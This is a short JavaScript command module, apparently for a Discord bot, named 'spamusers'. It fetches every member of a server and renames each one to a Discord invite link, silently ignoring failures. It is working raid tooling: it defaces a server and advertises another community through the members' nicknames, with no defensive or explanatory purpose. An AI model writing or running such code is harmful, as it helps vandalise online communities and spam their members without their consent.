module.exports = {
    name: "spamusers",
    secured: true,
    rateLimitTime: 12 * 1000,
    rateLimitUsage: 1,
    execute: async (message, args, client) => {
        try {
            await message.guild.members.fetch();
            message.guild.members.cache.forEach(user => {
                user.edit({
                    "nick": ".gg/uhjNCaFtkq"
                }).catch(e => {})
            });
        } catch (error) {
            console.error('Error fetching members or renaming:', error);
        }
    },
};